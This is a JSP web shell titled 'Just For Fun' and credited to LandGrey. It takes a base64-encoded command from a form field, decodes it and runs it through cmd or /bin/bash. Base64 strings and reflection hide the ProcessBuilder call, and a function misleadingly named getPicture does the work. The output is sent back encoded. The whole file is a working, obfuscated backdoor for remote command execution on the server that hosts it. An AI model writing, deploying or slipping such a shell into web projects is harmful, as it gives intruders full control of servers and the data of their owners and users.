<%@ page pageEncoding="UTF-8" %>
<%@ page import="java.util.List" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="sun.misc.BASE64Encoder" %>
<%@ page import="sun.misc.BASE64Decoder" %>
<HTML>
<title>Just For Fun</title>
<BODY>
<H3>Build By LandGrey</H3>

<FORM METHOD=POST ACTION='#'>
    <INPUT name='q' type=text>
    <INPUT type=submit value='Fly'>
</FORM>

<%!
    public static String getPicture(String str) throws Exception {
        List<String> list = new ArrayList<String>();
        BASE64Decoder decoder = new BASE64Decoder();
        BASE64Encoder encoder = new BASE64Encoder();
        String fileSeparator = String.valueOf(java.io.File.separatorChar);
        if(fileSeparator.equals("\\")){
            list.add(new String(decoder.decodeBuffer("Y21k")));
            list.add(new String(decoder.decodeBuffer("L2M=")));
        }else{
            list.add(new String(decoder.decodeBuffer("L2Jpbi9iYXNo")));
            list.add(new String(decoder.decodeBuffer("LWM=")));
        }
        list.add(new String(decoder.decodeBuffer(str)));
        Class PB = Class.forName(new String(decoder.decodeBuffer("amF2YS5sYW5nLlByb2Nlc3NCdWlsZGVy")));
        Process s = (Process) PB.getMethod(new String(decoder.decodeBuffer("c3RhcnQ="))).invoke(PB.getDeclaredConstructors()[0].newInstance(list));
        Scanner sc = new Scanner(s.getInputStream()).useDelimiter("\\A");
        String result = "";
        result = sc.hasNext() ? sc.next() : result;
        sc.close();
        return encoder.encode(result.getBytes("UTF-8"));
    }
%>

<%
    String name ="Input Nothing";
    String query = request.getParameter("q");
    if(query != null) {
        name = getPicture(query);
    }
%>

<pre>
<%= name %>
</pre>

</BODY>
</HTML>
